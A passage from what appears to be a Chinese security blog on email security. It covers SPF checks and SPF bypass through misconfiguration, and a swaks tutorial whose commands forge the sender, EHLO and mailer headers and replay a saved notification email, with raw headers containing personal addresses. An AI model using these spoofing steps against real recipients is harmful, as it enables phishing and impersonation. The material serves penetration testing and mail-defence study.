class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070237.000051</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt;  all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h3 id="SPF绕过"><a href="#SPF绕过" class="headerlink" title="SPF绕过"></a>SPF绕过</h3><h4 id="配置不当"><a href="#配置不当" class="headerlink" title="配置不当"></a>配置不当</h4><h5 id="ip-范围过大"><a href="#ip-范围过大" class="headerlink" title="ip 范围过大"></a>ip 范围过大</h5><p>v&#x3D;spf1 ip4:113.113.1.1&#x2F;16 </p><p>允许范围为 113.113.1.1-113.113.255.255，会存在拿下一台服务器就可以实现绕过</p><h5 id="spf-软拒绝"><a href="#spf-软拒绝" class="headerlink" title="spf 软拒绝"></a>spf 软拒绝</h5><p>由于硬拒绝会直接拒收不符合条件的邮件，为避免邮件丢失，很多企业都会将SPF设置为软拒绝。这样就会导致存在</p><h5 id="spf-记录格式错误"><a href="#spf-记录格式错误" class="headerlink" title="spf 记录格式错误"></a>spf 记录格式错误</h5><p>特别注意，多个IP段，确保每个IP段的开头都是 ipv4</p><h5 id="邮件服务器未配置支持-spf"><a href="#邮件服务器未配置支持-spf" class="headerlink" title="邮件服务器未配置支持 spf"></a>邮件服务器未配置支持 spf</h5><p>spf有两步，第一步是在域名添加spf记录，第二步是在邮件服务器上配置支持spf</p><p>如果邮件服务器没有配置支持 spf，就例如我们声明了，但是无法验证</p><h5 id="spf-配置DNS错误"><a href="#spf-配置DNS错误" class="headerlink" title="spf 配置DNS错误"></a>spf 配置DNS错误</h5><p>spf 解析在公网 DNS，内部邮件服务器配置的是内网 DNS ，内网 DNS 无法解析 spf ，也就是邮件服务器无法使用公网 spf 验证</p><h5 id="内网缺乏限制"><a href="#内网缺乏限制" class="headerlink" title="内网缺乏限制"></a>内网缺乏限制</h5><p>攻击者进入内网，如果内部邮件服务器信任内网IP且开启</p><h3 id="SPF-报错"><a href="#SPF-报错" class="headerlink" title="SPF 报错"></a>SPF 报错</h3><h4 id="SPF-PermError-Too-Many-DNS-Lookups"><a href="#SPF-PermError-Too-Many-DNS-Lookups" class="headerlink" title="SPF PermError: Too Many DNS Lookups"></a>SPF PermError: Too Many DNS Lookups</h4><p>RFC 规范文档 <a href="https://tools.ietf.org/html/rfc7208">RFC7208</a> 规定每次SPF检查 DNS查询的 mechanisms 和 modifier 限制在十次以内，包括 include mechanism 或 redirect modifier 带来的查询。也就是说 SPF 查询所有允许IP的所需要的查询次数不可以超过 10 次，否则会返回“SPF PermError：too many DNS lookups”，SPF 永久错误在 DMARC 中被解释为 fail，从而会降低邮件送达率。</p><p>规避由于SPF DNS 查询造成的DDoS攻击，攻击过程为攻击者将可控的域名SPF记录指向被攻击域名，攻击者通过向不同的邮件服务器发送大量邮件，导致被攻击域名接受到 SPF DNS 查询的流量，如果被攻击域名SPF记录层级没有限制，就会造成DDoS攻击，如果限制在10次以内，放大倍数最多也就10倍，可以大幅度缓解攻击力度。</p><p>SPF查询次数查看</p><p><a href="https://dmarcly.com/tools/spf-record-checker">https://dmarcly.com/tools/spf-record-checker</a></p><p>解决方法</p><p>1、确保查询不要超过10次</p><p>2、使用 safe SPF ，也就是通过 dmarcly 生成特定的SPF记录规避超过十次</p><p>例如：</p><p>qq.com的SPF会被压缩如下SPF记录，需要更新原本域名的SPF记录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">v=spf1 include:_u<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>._spf<span class="hljs-selector-class">.dmarcld</span><span class="hljs-selector-class">.com</span> -<br></code></pre></td></tr></table></figure><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>SPF验证 envelope From 地址，不验证头域 From地址</p><p>查看收件方SPF校验结果</p><p>gmail</p><p>显示原始邮件</p><p>163</p><p>查看信头，Authentication-Results字段可查看spf验证结果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g2-3; <span class="hljs-attribute">spf</span>=pass smtp.<span class="hljs-attribute">mail</span>=admin@vict.site;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>swaks</title>
    <link href="/2024/05/16/security/mailsec/swaks/"/>
    <url>/2024/05/16/security/mailsec/swaks/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="swaks-SWiss-Army-Knife-Smtp"><a href="#swaks-SWiss-Army-Knife-Smtp" class="headerlink" title="swaks(SWiss Army Knife Smtp)"></a>swaks(SWiss Army Knife Smtp)</h2><h3 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h3><p>1、kali自带</p><p>2、官网</p><p><a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p><p>3、yum install swaks</p><p>4、apt install swaks</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>swaks -to 被测试的邮箱</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>–header 邮件头信息，key:value (subject为标题)</p><p>–header-X-Mailer “value”   设置Mailer特征，不设置默认是带有swaks标记的（X-Mailer: swaks v20190914.0 jetmore.org&#x2F;john&#x2F;code&#x2F;swaks&#x2F;）</p><p>–header-Message-Id “value”   设置邮件Message-ID</p><p>–ehlo value 伪造ehlo头，要伪造发件人的域名，提供身份认证</p><p>–body value 邮件正文</p><p>–to 邮件接收者，多个接收者使用“,”进行分隔</p><p>–from 伪造的发件人</p><p>发送模板邮件</p><p>原始邮件转存为eml文件，swaks参数–data设置为保存的eml文件。</p><p>伪造的邮件和原始邮件不同点：</p><p>1、查看邮件原文：Sender不同</p><p>​Sender: <a href="mailto:&#104;&#x61;&#x77;&#107;&#x30;&#64;&#x76;&#x69;&#99;&#116;&#46;&#x73;&#105;&#x74;&#101;">&#104;&#x61;&#x77;&#107;&#x30;&#64;&#x76;&#x69;&#99;&#116;&#46;&#x73;&#105;&#x74;&#101;</a></p><p>​Sender: <a href="mailto:&#53;&#x34;&#98;&#55;&#102;&#x63;&#x36;&#x36;&#x2d;&#51;&#98;&#48;&#x33;&#45;&#x31;&#49;&#101;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#50;&#x35;&#52;&#48;&#48;&#x31;&#98;&#x64;&#x33;&#97;&#x32;&#64;&#x70;&#111;&#x73;&#x74;&#x6d;&#97;&#110;&#46;&#x68;&#x75;&#x6f;&#x78;&#105;&#97;&#110;&#46;&#99;&#x6e;">&#53;&#x34;&#98;&#55;&#102;&#x63;&#x36;&#x36;&#x2d;&#51;&#98;&#48;&#x33;&#45;&#x31;&#49;&#101;&#99;&#45;&#x39;&#97;&#x37;&#x38;&#x2d;&#x35;&#50;&#x35;&#52;&#48;&#48;&#x31;&#98;&#x64;&#x33;&#97;&#x32;&#64;&#x70;&#111;&#x73;&#x74;&#x6d;&#97;&#110;&#46;&#x68;&#x75;&#x6f;&#x78;&#105;&#97;&#110;&#46;&#99;&#x6e;</a></p><p>2、标题可设置不同</p><p>其他（包含时间）都是相同的</p><p>eml文件：【安全共识】项目进展通知_.eml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">Received: from ucmailc115.sendcloud.org (ucmailc115.sendcloud.org [120.132.55.74])<br>by newxmmxsza90.qq.com (NewMX) with SMTP <span class="hljs-built_in">id</span> C8AB2C2<br><span class="hljs-keyword">for</span> &lt;1482056240@qq.com&gt;; Mon, 01 Nov 2021 19:03:08 +0800<br>X-QQ-mid: xmmxsza90t1635764603tjang5mi6<br>X-QQ-XMAILINFO: NN7ERqmvDdhub2Gwh1cBAp8ZzlvgKuvJVy6fKhlhDpZG9E8bIRScTYUqG3hTCE<br> Y4fj96zCzu67ZxZmpg631lAQDnTVqdHCc/r3lVRH7mcp5jgtjBYHsIg2zFsTQdGZK9F8BFlWINJ8<br> iKUfRH+FurBOaJDyrswer/h96TmObwf9UcD/6fPQpvJHjFtmLr/c5ep4qAN9UtX+ZybWDsphvhMd<br> 3jB0Nzxg/pmuoic00tjRG6SWyEir6/B1gzxRndQeoTBkU20zMHRY5FVSWNtnOgY0Bzx4griypRFp<br> cQLpTQ5stdsB94vfI+EcF/QAFUY0X7lF2Vdym1OHKKFM4u/pL6dnaPltCmsfPDITeb0WAUobPavR<br> bImWPl2rQsL8gEplCOxZgKAmIfysWdDduA4wQfJ2C5nq/8Eej9PbG0KceZoYJ3o/SWAtP+bRWqa1<br> o0Jps0MvuYKWnwpZO+CfUdCKZJ5axZdpafgCWJ7NDYHtuPFYnNzogFh3I/0C8VWU/60Cntun6Xyb<br> W5MboPq6GgRTPmAqHjS50DR52Q1vQiu5f8MaKQxgQqY/CMKT0oqAJiRkSgRgK9MfT0KvkJPM45ro<br> OBuz290hepErsDTbd8oIY0FWOZkChmDwUYlnTg33REFl6bOFA1hOs5zcVbeP1fqaTfR6niUP7/yd<br> BiCOsHRZK97NyIJ/oxjeS97fmOqHWrTeaavxcIcFXranytIwb/oZ7F3IKb3IW70m4e2cSJhR8QjP<br> /de676fHF9eSkNpf5jEBVMbrrlBZqWq4tZRr6Nm1auIOU93FIZnffkcFeIsAfdjxixDpywwexR3Q<br> un4vdXkLyrAqYC1+/lwCiaPYh9iyDofXi5eJsUcXTDooeD82xj4o41lvxOO/8b6rwzWorsRpgWcI<br> idzrFqXBBnKDju3Rw3tchjfQ+s9Rv1vBV+OJjwGBn8I5+Wl6mlyEE90cIqm1StCTj3M+fXxtLU9l<br> 5eeso3tVaqdE2OHrRWE/4WUrjjB01/PapvkvZbVnsk5I5ZB46n8Cq6eyZF5x2f/vOJB/3F85LRsN<br> Tt/uFp69RaBbDHhlw/+Zn8cPXiWSNe/MUmMqGw964RF4kbQdPQPQL7YgvaK+a/BNY1jngEzBylmc<br> 6C2rco2pTtDn0zC+GdnOGeDV6hGYg1EAUrjJd291rluoB9zBacMb8QolSw7w==<br>Sender: 54b7fc66-3b03-11ec-9a78-5254001bd3a2@postman.huoxian.cn<br>DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;<br> d=postman.huoxian.cn; i=@postman.huoxian.cn; q=dns/txt; s=mail;<br> t=1635764603; h=content-type : mime-version : subject : from : to :<br> <span class="hljs-built_in">date</span> : message-id : reply-to : list-unsubscribe : from;<br> bh=U/bh3WoQkLMciTodzPBwWfHFVUFbvh8pMVFSu0WVXg4=;<br> b=AWHql3thwjkoShz2wkl5Q5CotpxBIhm/cYX8iC84lcx9zYSwr82Z5vUUY1xbVVQBWfVVR<br> ejKixS7qPF90EtKOfWmhQMF1Gu4PBq9suFOJL5DaDtQDrssSm6cw0KyKZnde00qyCGBowPj<br> kZlLgHGovi/+5V33q7OepO9LbBseIsk=<br>Received: from huoxian-sso-prod-celery-5fdf486bd4-7tpp5 (Unknown [127.0.0.1])         by SendCloud Inbound Server with ESMTPA <span class="hljs-built_in">id</span> 38BF8035-1FF3-46E1-907E-80EBEF09BE0E.1         envelope-from &lt;noreplay@postman.huoxian.cn&gt; (authenticated bits=0); Mon, 01 Nov 2021 19:03:23 +0800<br>Content-Type: multipart/alternative; boundary=<span class="hljs-string">&quot;===============9079726093015921879==&quot;</span><br>MIME-Version: 1.0<br>Subject: =?utf-8?b?44CQ5a6J5YWo5YWx6K+G44CR6aG555uu6L+b5bGV6YCa55+l?=<br>From: noreplay@postman.huoxian.cn<br>To: 1482056240@qq.com<br>Date: Mon, 01 Nov 2021 11:03:23 -0000<br>Message-ID: &lt;1635764603279_101502_7386_9958.sc-10_9_13_213-inbound0@postman.huoxian.cn&gt;<br>REPLY-TO: noreplay@postman.huoxian.cn<br>X-SENDCLOUD-UUID: 1635764603279_101502_7386_9958.sc-10_9_13_213-inbound0<span class="hljs-variable">$1482056240</span>@qq.com<br>X-SENDCLOUD-LOG: 1635764603279_101502_7386_9958.sc-10_9_13_213-inbound0<span class="hljs-variable">$1482056240</span>@qq.com<span class="hljs-comment">#1482056240@qq.com#239907#101502#0#false#false#0#-1</span><br>X-SENDCLOUD-LOG-NEW: MTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIzE0ODIwNTYyNDBAcXEuY29tIzIzOTkwNyMxMDE1MDIjMCNmYWxzZSNmYWxzZSMwIy0x<br>X-SMTPAPI: <br>List-Unsubscribe: &lt;mailto:0_239907_1635764603279_101502_7386_9958.sc-10_9_13_213-inbound0@postman.huoxian.cn&gt;<br><br><br>--===============9079726093015921879==<br>Content-Type: text/plain; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>MIME-Version: 1.0<br>Content-Transfer-Encoding: 7bit<br><br>Here is the message.<br>--===============9079726093015921879==<br>Content-Type: text/html; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>MIME-Version: 1.0<br>Content-Transfer-Encoding: 8bit<br><br>&lt;!DOCTYPE html&gt;<br>                            &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>                                 &lt;body&gt;<br>                                    &lt;p&gt;您关注的项目「某互联网银行安全测试项目」,项目已开始，项目开始时间:2021-11-01 19:00:00,结束时间:2021-11-30 23:59:59,请及时登录火线平台参与项目&lt;/p&gt;<br>                                     &lt;button&gt;&lt;a  href=<span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/click/eyJuZXRlYXNlIjogImZhbHNlIiwgIm1haWxsaXN0X2lkIjogMCwgInRhc2tfaWQiOiAiIiwgImVtYWlsX2lkIjogIjE2MzU3NjQ2MDMyNzlfMTAxNTAyXzczODZfOTk1OC5zYy0xMF85XzEzXzIxMy1pbmJvdW5kMCQxNDgyMDU2MjQwQHFxLmNvbSIsICJzaWduIjogIjYwMGRhMzliNDAyNDgyYzk1MDE2MGRkMmNlMzZhODQwIiwgInVzZXJfaGVhZGVycyI6IHt9LCAibGFiZWwiOiAwLCAidHJhY2tfZG9tYWluIjogInNjdHJhY2suc2VuZGNsb3VkLm5ldCIsICJyZWFsX3R5cGUiOiAiIiwgImxpbmsiOiAiaHR0cHMlM0EvL3d3dy5odW94aWFuLmNuL3Byb2plY3QvZGV0YWlsJTNGcGlkJTNEMjExIiwgIm91dF9pcCI6ICIxMjAuMTMyLjU1Ljc0IiwgImNvbnRlbnRfdHlwZSI6ICIwIiwgInVzZXJfaWQiOiAxMDE1MDIsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwN30=.html&quot;</span>  &gt;查看详情&lt;/a&gt;&lt;/button&gt;<br>                                 &lt;/body&gt;<br>                            &lt;/html&gt;&lt;table cellpadding=<span class="hljs-string">&quot;0&quot;</span> cellspacing=<span class="hljs-string">&quot;0&quot;</span> border=<span class="hljs-string">&quot;0&quot;</span> width=<span class="hljs-string">&quot;100%&quot;</span>&gt;&lt;<span class="hljs-built_in">tr</span>&gt;&lt;td align=<span class="hljs-string">&quot;center&quot;</span> style=<span class="hljs-string">&quot;padding-top: 10px;&quot;</span>&gt;&lt;div style=<span class="hljs-string">&quot;border-top:1px solid #ddd;padding:10px;&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogMTAxNTAyLCAidGFza19pZCI6ICIiLCAiZW1haWxfaWQiOiAiMTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIiwgInNpZ24iOiAiZTcxM2ZmNTg2ZDIyYTE5NTg5MDJjNTE5YjkwYzQzODEiLCAidXNlcl9oZWFkZXJzIjoge30sICJsYWJlbCI6IDAsICJ0cmFja19kb21haW4iOiAic2N0cmFjay5zZW5kY2xvdWQubmV0IiwgInJlYWxfdHlwZSI6ICIiLCAibmV0ZWFzZSI6ICJmYWxzZSIsICJvdXRfaXAiOiAiMTIwLjEzMi41NS43NCIsICJjb250ZW50X3R5cGUiOiAiMCIsICJyZWNlaXZlciI6ICIxNDgyMDU2MjQwQHFxLmNvbSIsICJtYWlsbGlzdF9pZCI6IDAsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwNywgInBhZ2VfaWQiOiAtMX0%3D&quot;</span> target=<span class="hljs-string">&quot;_blank&quot;</span> style=<span class="hljs-string">&quot;display: table-cell;display:inline-block;background:#ddd; border-radius:4px;padding: 3px 15px;color:#a6a6a6;text-decoration:none;font-size:12px;&quot;</span>&gt;点击这里取消订阅&lt;br /&gt;click to unsubscribe&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<br>--===============9079726093015921879==--<br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>swaks –header “Subject: vapd10271613” –header-X-Mailer “staff.domain” –header-Message-Id “staff.domain” –to <a href="mailto:&#x6d;&#97;&#105;&#108;&#x31;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#x64;&#111;&#x6d;&#97;&#x69;&#x6e;">&#x6d;&#97;&#105;&#108;&#x31;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#x64;&#111;&#x6d;&#97;&#x69;&#x6e;</a>,<a href="mailto:&#109;&#97;&#x69;&#x6c;&#50;&#64;&#115;&#116;&#97;&#102;&#102;&#x2e;&#x64;&#111;&#x6d;&#x61;&#105;&#x6e;">&#109;&#97;&#x69;&#x6c;&#50;&#64;&#115;&#116;&#97;&#102;&#102;&#x2e;&#x64;&#111;&#x6d;&#x61;&#105;&#x6e;</a> –from <a href="mailto:&#118;&#97;&#112;&#64;&#115;&#116;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#97;&#x69;&#110;">&#118;&#97;&#112;&#64;&#115;&#116;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#97;&#x69;&#110;</a> –ehlo staff.domain –body “2021.1028.1421helloword”</p><p>swaks –header “Subject:test1” –to <a href="mailto:&#x6e;&#99;&#x30;&#x69;&#115;&#105;&#x6e;&#105;&#64;&#102;&#111;&#120;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x6e;&#99;&#x30;&#x69;&#115;&#105;&#x6e;&#105;&#64;&#102;&#111;&#120;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> –from <a href="mailto:&#x68;&#97;&#x77;&#107;&#x30;&#x40;&#x76;&#105;&#99;&#116;&#x2e;&#115;&#x69;&#x74;&#101;">&#x68;&#97;&#x77;&#107;&#x30;&#x40;&#x76;&#105;&#99;&#116;&#x2e;&#115;&#x69;&#x74;&#101;</a> –header-X-Mailer “vict.site”</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Received</span>: from localhost.localdomain ([<span class="hljs-number">114.132.246.141</span>])<br><span class="hljs-attribute">by</span> newxmmxsza90.qq.com (NewMX) with SMTP id <span class="hljs-number">70</span>C31E34<br><span class="hljs-attribute">for</span> &lt;nc0isini@foxmail.com&gt;; Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">X</span>-QQ-mid: xmmxsza90t1635856092tx091has2<br><span class="hljs-attribute">X</span>-QQ-XMAILINFO: MjtcwOZJa0njs2uRVUuJXHvZ2PknYPWArBD3CyVj9A4cHs7JvBZnQH/hKdIeB1<br> <span class="hljs-attribute">hALD6NnCa6Ssa1H9ZqRKVPIckkKzu4uzKY</span>/FbhJ7v7UwUyKs4RO1uhoT0lLKY9qpsRnLYQIljkC0<br> <span class="hljs-attribute">wsiOSlJIEwJ9VHGogTKBLOTA4y8PrF3eVAowQyrJd9trwsfBzbIJfbp7MXKSu064mG0TJCOQOwCl</span><br> <span class="hljs-attribute">dsyBj01rjnZhJU</span>/PNbogZYxRvdCvKw0Njxzu9U+H5HWzkp13wrUacPPqojN8JXvoY3bKR9xq5EXc<br> <span class="hljs-attribute">CkL</span>/a4ldNIM32edwRqnPeDvIx+fVZDIJ6ojgDhyWbNEl8ix8DBVcnmBd5sWSYcWO48uggTG0rvFO<br> <span class="hljs-attribute">4aW</span>+<span class="hljs-number">9</span>wYE80kIpbNSPfb32Ufzc0Bd/CiKAs3erc1d+gSBFs/wYpmhTarrZ+Gq8MWzGNdAj6phj3G/<br> <span class="hljs-attribute">DH91gW</span>//Af43ioJgrR7hM0xwlleI5RShYvwCl0h4NXm9SfWgzf0BEYy6HHW/xhAImxBEca7r3hOa<br> <span class="hljs-attribute">1TBAo9VvnCf8</span>+nmN5VAVae/tdnDiqTtwTtBb6HLj2h76CbvwTh0Tt3j22SPTfPwh5BPJ7mldOIwt<br> <span class="hljs-attribute">8R</span>+<span class="hljs-number">0</span>TUunNW6vX7ixNg9AHvV6vPrrO0UBSO5psBV/U22AF7Lmp6yfxhCnwRbkyoTDuy70cBJ38rHY<br> <span class="hljs-attribute">JDXqu08XbfSiQ9w</span>+uelYsd5C6acz2auVDr8/j63JCs5qDpSgcHdTxL0xZFKjEp1ogZd77pP1FiB6<br> <span class="hljs-attribute">olVRj1zKeg0VYdahstB1</span>+AfgshNzSL8hdA<br><span class="hljs-attribute">Date</span>: Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">To</span>: nc0isini@foxmail.com<br><span class="hljs-attribute">From</span>: hawk0@vict.site<br><span class="hljs-attribute">Subject</span>:test1<br><span class="hljs-attribute">Message</span>-Id: &lt;<span class="hljs-number">20211102202812</span>.<span class="hljs-number">1761846</span>@localhost.localdomain&gt;<br><span class="hljs-attribute">X</span>-Mailer: vict.site<br><br><span class="hljs-attribute">This</span> is a test mailing<br></code></pre></td></tr></table></figure><p>swaks –header “Subject:test1” –to <a href="mailto:&#110;&#x63;&#48;&#x69;&#115;&#x69;&#x6e;&#105;&#x40;&#102;&#111;&#x78;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;">&#110;&#x63;&#48;&#x69;&#115;&#x69;&#x6e;&#105;&#x40;&#102;&#111;&#x78;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a> –from <a href="mailto:&#104;&#97;&#119;&#107;&#48;&#64;&#118;&#x69;&#x63;&#x74;&#46;&#x73;&#x69;&#x74;&#101;">&#104;&#97;&#119;&#107;&#48;&#64;&#118;&#x69;&#x63;&#x74;&#46;&#x73;&#x69;&#x74;&#101;</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">Received</span>: from localhost.localdomain ([<span class="hljs-number">114.132</span>.<span class="hljs-number">246.141</span>])<br>by newxmmxszc77.qq.com (<span class="hljs-type">NewMX</span>) with <span class="hljs-type">SMTP</span> id 63B9BAA0<br><span class="hljs-keyword">for</span> <span class="hljs-operator">&lt;</span>nc0isini<span class="hljs-meta">@foxmail</span>.com<span class="hljs-operator">&gt;</span>; <span class="hljs-type">Tue</span>, <span class="hljs-number">02</span> <span class="hljs-type">Nov</span> <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-type">X</span><span 